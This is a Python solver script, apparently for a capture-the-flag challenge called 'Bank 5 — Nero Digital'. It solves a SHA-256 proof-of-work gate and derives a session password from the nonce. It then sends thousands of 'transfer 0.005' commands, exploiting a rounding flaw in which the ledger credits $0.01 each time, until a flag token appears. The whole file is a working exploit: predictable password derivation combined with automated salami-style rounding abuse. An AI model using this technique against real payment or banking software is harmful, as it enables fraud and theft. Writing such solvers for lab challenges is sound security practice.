#!/usr/bin/env python3
"""
Solver for Bank 5 — Nero Digital
Exploit: Banker's Rounding v2 — 0.005 rounds to 0.00, but ledger posts $0.01

PoW: SHA256(nonce + "NERO_DIGITAL_2077")[:5] == "00000"
Then derive password: SHA256("NERO_SESSION_" + nonce)[:10]

Usage: python3 solve_bank5.py <host> [port]
"""
import socket, time, sys, hashlib

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9005

CHALLENGE = "NERO_DIGITAL_2077"
MAGIC     = "0.005"
DELAY     = 1 / 150


def solve_pow(challenge: str) -> str:
    """Brute-force nonce. ~2^20 iterations average for 5 leading zeros."""
    print(f"[*] Solving PoW for challenge: {challenge}")
    t = time.time()
    n = 0
    while True:
        nonce = str(n)
        h = hashlib.sha256(f"{nonce}{challenge}".encode()).hexdigest()
        if h.startswith("00000"):
            elapsed = time.time() - t
            print(f"[+] PoW solved: nonce={nonce} hash={h[:12]}... ({elapsed:.1f}s, {n:,} iterations)")
            return nonce
        n += 1
        if n % 100000 == 0:
            print(f"[.] PoW: trying {n:,}...", end="\r", flush=True)


def derive_password(nonce: str) -> str:
    return hashlib.sha256(f"NERO_SESSION_{nonce}".encode()).hexdigest()[:10]


def solve():
    print(f"[*] Connecting to {HOST}:{PORT}")

    s = socket.socket()
    s.connect((HOST, PORT))
    s.settimeout(60)

    def recv_prompt(p):
        buf = b""
        while p.encode() not in buf:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
        return buf.decode(errors="replace")

    # PoW gate
    recv_prompt("Nonce: ")
    nonce = solve_pow(CHALLENGE)
    s.sendall((nonce + "\n").encode())

    resp = recv_prompt("Password")
    print(resp.strip())

    password = derive_password(nonce)
    print(f"[*] Derived password: {password}")

    s.sendall((password + "\n").encode())
    s.settimeout(10)

    welcome = recv_prompt("nero> ")
    print(welcome.strip())

    if "FAILED" in welcome or "failed" in welcome:
        print("[-] Auth failed."); s.close(); return None

    token = None
    count = 0
    t_start = time.time()

    print(f"[*] Starting Banker's Rounding exploit — magic: {MAGIC}")

    while not token:
        s.sendall(f"transfer {MAGIC}\n".encode())
        resp = b""
        while b"nero> " not in resp and b"TOKEN_" not in resp:
            resp += s.recv(4096)
        resp = resp.decode(errors="replace")

        count += 1
        if count % 1000 == 0:
            elapsed = time.time() - t_start
            rate = count / elapsed
            print(f"\r[*] Tx: {count:,} | ${count/100:.2f} | {rate:.0f}/s", end="", flush=True)

        if "TOKEN_" in resp:
            for line in resp.split("\n"):
                if "TOKEN_" in line:
                    token = line.split()[-1].strip()
            break

        if "locked" in resp.lower():
            print("\n[-] Locked!"); break

        time.sleep(DELAY)

    print(f"\n[+] DONE — {count:,} tx")
    if token:
        print(f"[+] TOKEN: {token}")
        with open("tokens.txt", "a") as f:
            f.write(f"BANK5:{token}\n")
    s.close()
    return token


if __name__ == "__main__":
    solve()
